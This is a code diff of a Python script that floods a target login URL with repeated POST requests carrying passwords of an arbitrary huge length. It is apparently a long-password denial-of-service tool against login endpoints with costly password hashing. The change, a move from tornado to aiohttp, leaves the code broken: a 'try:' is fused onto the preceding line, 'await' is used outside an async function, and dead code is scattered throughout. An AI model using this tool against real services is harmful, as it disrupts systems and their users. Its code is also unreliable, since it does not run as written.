@@ -1,7 +1,9 @@
 import sys, argparse
 import urllib.parse
 from time import sleep
-import tornado.httpclient
+import asyncio
+import aiohttp
+#import tornado.httpclient
 
 parser = argparse.ArgumentParser(description='Description here')
 parser.add_argument('-u', '--url', dest='url', type=str, required=True,help='url')
@@ -14,31 +16,39 @@ args = parser.parse_args()
 
 # @todo Make this asynchronous
 #http_client = tornado.httpclient.AsyncHTTPClient()
-http_client = tornado.httpclient.HTTPClient()
+#http_client = tornado.httpclient.HTTPClient()
 sys.stderr.write("Generating password...\n")
 password = "x" * args.size
 sys.stderr.write("Done! Password length: "+ str(len(password)) +" characters.\n")
 
-post_data = { 'login': args.login, 'password': password }
+payload = { 'login': args.login, 'password': password }
 
-body = urllib.parse.urlencode(post_data)
+async def makeRequest(url,payload):
+    r = await aiohttp.post(url, data=payload)
 
 
+#r = await aiohttp.post('http://httpbin.org/post', data=payload)
+#r = await aiohttp.get('https://api.github.com/events')
+#print(await r.text())
+
+#body = urllib.parse.urlencode(post_data)
+
+'''
 req = tornado.httpclient.HTTPRequest(
     url = args.url,
     method = "POST",
     body = body
 )
-
+'''
 for i in range(args.repeats):
-    sys.stderr.write("Sending password "+str(i+1)+": "+str(args.size)+" bytes\n")
-    try:
-        http_client.fetch(req)
+    sys.stderr.write("Sending password "+str(i+1)+": "+str(args.size)+" bytes\n") try:
+        #http_client.fetch(req)
+        await makeRequest(args.url, payload)
         sleep(args.delay)
     except Exception as e:
         sys.stderr.write("Error: " + str(e))
 
-http_client.close()
+#http_client.close()
 sys.exit()
 
 '''
